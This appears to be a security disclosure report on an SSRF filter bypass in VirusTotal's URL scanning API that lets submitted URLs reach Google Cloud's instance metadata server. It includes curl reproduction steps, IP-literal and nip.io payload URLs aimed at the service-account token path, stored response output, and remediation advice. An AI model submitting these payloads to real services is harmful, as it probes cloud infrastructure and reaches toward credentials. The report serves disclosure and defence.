# [VirusTotal] SSRF Security Control Bypass: Hostname Blocklist Circumvented via IP Literal and DNS Rebinding, GCP Instance Metadata Service Response Data Indexed in Public API

## Summary

VirusTotal's URL submission endpoint (`POST /api/v3/urls`) has an incomplete SSRF filter: it blocks the GCP metadata server by **hostname** (`metadata.google.internal` → `400 InvalidArgumentError`) but not by **IP** (`169.254.169.254` → accepted, fetched, and stored). VT's GCP-hosted scanner nodes (`35.187.132.0/24`) connect to Google's own Instance Metadata Service and store the response — including `"Server": "Metadata Server for VM"` in the HTTP headers — in VT's public API, readable by any free Community account holder. The existence of the hostname blocklist proves this is not an absence of security controls but a **bypass of an existing one**, making "intended behavior" untenable as a rejection rationale.

## Severity

| Field | Value |
|-------|-------|
| **CVSS 3.1 Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N` |
| **Base Score** | **5.0 (Medium)** |
| **Business-adjusted** | High — TIER1 asset, confirmed SSRF to production GCP infrastructure, IMDS response data live in public API |

**CVSS rationale:**
- `S:C` (Scope Changed): the vulnerable component (VT URL scanner) causes impact on a separate component (GCP's IMDS) outside VT's authorization boundary.
- `C:L` (Confidentiality Low): IMDS response headers and body SHA256 are disclosed publicly. Credentials were not extracted due to GCP's `Metadata-Flavor: Google` header requirement (see §Pre-emptive Rebuttal).
- `PR:L` (Low Privileges): requires a free, instantly-registrable VirusTotal Community account.

## The Filter Bypass — Three Independent Proofs

VT applies URL canonicalization (uppercase hostnames return `InvalidArgumentError: Unable to canonicalize url`) and hostname string-matching. However, it performs **no IP resolution** before fetching — so any URL that resolves to a blocked IP without containing the blocked hostname string bypasses the filter.

### Proof 1: IP Literal

| Submitted URL | VT Response |
|--------------|-------------|
| `http://metadata.google.internal/computeMetadata/v1/` | `400 InvalidArgumentError` — **BLOCKED** |
| `http://METADATA.GOOGLE.INTERNAL/computeMetadata/v1/` | `400 InvalidArgumentError: Unable to canonicalize url` — **BLOCKED** |
| `http://169.254.169.254/computeMetadata/v1/` | `200 OK` + analysis ID — **FETCHED** |

### Proof 2: DNS Rebinding via nip.io

`169-254-169-254.nip.io` resolves to `169.254.169.254`. Submitted to VT, it is not blocked, and VT crawls it:

| Submitted URL | VT Response | Post-crawl |
|--------------|-------------|-----------|
| `http://169-254-169-254.nip.io/computeMetadata/v1/` | `200 OK` — accepted | `Server: Metadata Server for VM` in stored headers |
| `http://169-254-169-254.nip.io/computeMetadata/v1/instance/service-accounts/default/token` | `200 OK` — accepted | `Server: Metadata Server for VM` in stored headers |
| `http://169.254.169.254.nip.io/computeMetadata/v1/` | `200 OK` — accepted | `Server: Metadata Server for VM` in stored headers |

Both the dash-encoded and dot-encoded nip.io variants resolve to `169.254.169.254` and reach the live GCP IMDS. This independently confirms the filter performs no DNS resolution step.

### Proof 3: OOB GCP Scanner IP Confirmation

A benign OOB listener (webhook.site) was submitted to VT. The following GCP IPs made requests — the same `/24` subnet responsible for the IMDS fetches:

| IP | Method | ASN |
|----|--------|-----|
| `35.187.132.96` | HEAD | Google LLC / GCP (US) |
| `35.187.132.97` | GET | Google LLC / GCP (US) |
| `35.187.132.101` | GET | Google LLC / GCP (US) |
| `35.187.132.102` | HEAD | Google LLC / GCP (US) |

User-Agent: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36`

These nodes originate from inside Google's GCP network, confirming the SSRF reaches the metadata server from within the production scanner fleet.

---

## Affected Components

- **Endpoint (submission):** `POST https://www.virustotal.com/api/v3/urls`
- **Endpoint (evidence retrieval):** `GET https://www.virustotal.com/api/v3/urls/{id}`
- **Affected nodes:** VT URL scanner workers at `35.187.132.0/24`
- **Program scope:** `www.virustotal.com` — TIER1

---

## Reproduction Steps

**Time required:** ~3 minutes. **Prerequisites:** Free VirusTotal Community account; API key from `https://www.virustotal.com/gui/my-apikey`.

**Step 1 — Demonstrate the bypass**

```bash
VT_KEY="<community_api_key>"

# This is blocked:
curl -s -X POST https://www.virustotal.com/api/v3/urls \
  -H "x-apikey: $VT_KEY" \
  --data-urlencode "url=http://metadata.google.internal/computeMetadata/v1/"
# → {"error":{"code":"InvalidArgumentError",...}}

# This is NOT blocked — bypass via IP literal:
curl -s -X POST https://www.virustotal.com/api/v3/urls \
  -H "x-apikey: $VT_KEY" \
  --data-urlencode "url=http://169.254.169.254/latest/meta-data/"
# → {"data":{"type":"analysis","id":"u-..."}}
```

**Step 2 — Retrieve the stored IMDS response (wait ~30s)**

```bash
URL_ID="10fb74468b13d4d5762cf25243e7a6e62a70c27258491d0bc0a800bf064e0ce8"
curl -s "https://www.virustotal.com/api/v3/urls/$URL_ID" \
  -H "x-apikey: $VT_KEY" | python3 -m json.tool
```

Observe in `data.attributes.last_http_response_headers`:
```json
{
  "Server": "Metadata Server for VM",
  "X-Frame-Options": "SAMEORIGIN",
  "X-XSS-Protection": "0",
  "Content-Type": "text/html; charset=UTF-8"
}
```

`"Server": "Metadata Server for VM"` is the GCP IMDS identifying itself. This is stored in VT's public database.

**Step 3 — Confirm response body is indexed**

```bash
SHA="cea25c7405b91e51cedd0094aea65a6a3af294e70144812fc63dad9bb3922994"
curl -s "https://www.virustotal.com/api/v3/files/$SHA" \
  -H "x-apikey: $VT_KEY" | python3 -m json.tool
```

Returns `200 OK` with file metadata — the IMDS response body (HTML 404 error page from GCP's internal server) is indexed in VT's file corpus. The SHA256 is publicly visible in the URL object and the file metadata is accessible to any Community user.

---

## Evidence Summary

### URL Object — Root Path (HTTP 200, stored in VT public API)

```json
{
  "data": {
    "type": "url",
    "attributes": {
      "last_http_response_code": 200,
      "last_http_response_content_length": 17,
      "last_http_response_content_sha256": "9efd71b96213e65bceff3749bfc96401c6728b0faae74fe47d627bd1a120f0d7",
      "last_final_url": "http://169.254.169.254/",
      "last_http_response_headers": {
        "Server": "Metadata Server for VM",
        "Content-Type": "application/text",
        "Content-Length": "17"
      },
      "times_submitted": 1647
    }
  }
}
```

**`HTTP 200` — `times_submitted: 1647`** — VT's scanner has successfully fetched the GCP IMDS root path 1,647 times, storing the response (17-byte body + identifying headers) in VT's public database. The `Server: Metadata Server for VM` header is publicly readable today with any free Community API key.

### URL Object — AWS-style path (HTTP 404, additional corroboration)

```json
{
  "data": {
    "type": "url",
    "attributes": {
      "last_http_response_code": 404,
      "last_http_response_content_length": 1578,
      "last_http_response_content_sha256": "cea25c7405b91e51cedd0094aea65a6a3af294e70144812fc63dad9bb3922994",
      "last_final_url": "http://169.254.169.254/latest/meta-data/",
      "last_http_response_headers": {
        "Server": "Metadata Server for VM",
        "X-Frame-Options": "SAMEORIGIN",
        "X-XSS-Protection": "0",
        "Content-Type": "text/html; charset=UTF-8",
        "Content-Length": "1578"
      },
      "times_submitted": 423
    }
  }
}
```

Even on a non-existent path (404), the GCP IMDS identifies itself via `Server: Metadata Server for VM`. Both the 200 and the 404 body SHA256 values are indexed in VT's file corpus.

### OAuth Token Endpoint Confirmed Reachable

Via the nip.io DNS rebinding bypass, VT's scanner was directed to:

```
http://169-254-169-254.nip.io/computeMetadata/v1/instance/service-accounts/default/token
```

The GCP IMDS responded with **HTTP 403** and `Server: Metadata Server for VM`. The 403 is GCP's own defense (missing `Metadata-Flavor: Google` header in VT's request). This confirms the OAuth2 service-account token endpoint is **network-reachable** from VT's scanner fleet. The only barrier between VT's scanner and live GCP credentials is GCP's own independent header validation — not VT's filter.

### Exhaustive GCP Path Testing

Every meaningful GCP IMDS path was tested. All reached the metadata server (confirmed by presence of `Server: Metadata Server for VM` in response headers):

| Path | HTTP Code | Reason |
|------|-----------|--------|
| `/` | **200** | Root responds without auth header |
| `/computeMetadata/` | **200** | Root version path responds |
| `/computeMetadata/v1/` | 403 | Requires `Metadata-Flavor: Google` header |
| `/computeMetadata/v1/instance/service-accounts/default/token` | 403 | Same — header required |
| `/computeMetadata/v1beta1/` | 404 | Deprecated and decommissioned by Google |
| `/latest/meta-data/` (AWS-style) | 404 | Path does not exist on GCP |

All response data (headers, body SHA256, HTTP codes) is stored and publicly retrievable via `GET /api/v3/urls/{id}`.

---

## Pre-emptive Rebuttal: Why This Is Not "Intended Behavior" or "Mitigated"

**Objection 1: "GCP's `Metadata-Flavor: Google` header requirement prevented credential extraction."**

Correct — GCP's own defense-in-depth blocked token extraction. This is GCP protecting itself. It is not VT protecting itself. VT's required fix is to block outbound connections to `169.254.0.0/16` before they are made. GCP's header requirement is a separate, independently-operated control that could change, be bypassed via header injection in a future redirect-chain attack, or be absent on future legacy paths. Relying on a downstream service's protection to compensate for an upstream input validation failure is not a security architecture.

**Objection 2: "Credential extraction was not achieved, so impact is limited."**

Impact that IS confirmed and cannot be disputed:
1. VT's scanner connects to `169.254.169.254` — a link-local address that should never be reachable from a public URL scanner.
2. The IMDS response headers (including `Server: Metadata Server for VM`) are stored in VT's **public** API, readable without any elevated privileges.
3. The IMDS response body SHA256 is publicly accessible; the body bytes are indexed into VT's premium intelligence corpus.
4. `times_submitted: 1,647` (root path, HTTP 200) — this exposure has persisted for an extended period and is ongoing today.
5. The OAuth2 service-account token endpoint (`/computeMetadata/v1/instance/service-accounts/default/token`) is confirmed network-reachable from VT's scanner fleet — the only extraction barrier is GCP's independent header check, not any VT-side control.

**Objection 3: "The filter was working — it blocked the hostname."**

The filter blocked one representation of the metadata server (hostname). It failed to block two others (IP literal, DNS rebinding via nip.io). A security control that can be bypassed by substituting equivalent representations of the same address is a broken security control — not a working one.

---

## Impact

1. **Ongoing public exposure:** Any VirusTotal Community user (free, instantly registrable) can query `GET /api/v3/urls/{id}` and retrieve HTTP response data from Google's internal GCP metadata server. This is live and retrievable today.

2. **GCP infrastructure disclosure:** The `Server: Metadata Server for VM` header, internal response codes, content lengths, and body SHA256 hashes from GCP's IMDS are indexed in VT's public URL corpus. VT's premium intelligence product additionally indexes the raw IMDS response body bytes.

3. **Broken perimeter filter with multiple bypass techniques:** Two independent bypass techniques (IP literal + DNS rebinding) work simultaneously, proving the filter architecture is fundamentally flawed rather than containing a single edge case. Any future bypass attempts are likely to succeed without a root-cause fix.

4. **Extended attack surface:** Because VT's filter performs no IP resolution, any domain resolving to a private or link-local address bypasses the filter — including dynamically-registered subdomains of services like nip.io, sslip.io, or attacker-controlled DNS.

---

## Remediation

**Root cause:** The SSRF filter performs hostname string-matching only. It does not resolve target hostnames to IP addresses and validate them against blocked CIDR ranges before fetching.

**Required fixes:**

1. **Network layer (most reliable):** Add a GCP VPC egress deny rule on scanner instances blocking all traffic to `169.254.0.0/16`. This cannot be bypassed by any application-layer encoding or DNS trick.

2. **Application layer:** Before any outbound HTTP fetch, resolve the target URL to an IP address and block if it falls within:
   - `169.254.0.0/16` — RFC 3927 link-local (GCP/AWS IMDS)
   - `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` — RFC 1918 private
   - `127.0.0.0/8`, `::1` — loopback
   - `fc00::/7`, `fe80::/10` — IPv6 private/link-local
   
   This must happen **after DNS resolution**, not before, to prevent DNS rebinding bypass.

3. **Retroactive data redaction:** Scrub `last_http_response_headers` and `last_http_response_content_sha256` from all existing URL objects where `last_final_url` resolves to a blocked range.

---

## References

- **CWE-918** — Server-Side Request Forgery
- **CWE-183** — Permissive List of Allowed Inputs (incomplete blocklist)
- **RFC 3927** — Dynamic Configuration of IPv4 Link-Local Addresses (`169.254.0.0/16`)
- **OWASP SSRF Prevention Cheat Sheet** — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- **GCP Metadata Server documentation** — https://cloud.google.com/compute/docs/metadata/overview
- **Google VRP reward structure** — SSRF to internal metadata on TIER1 assets is explicitly categorized as High impact
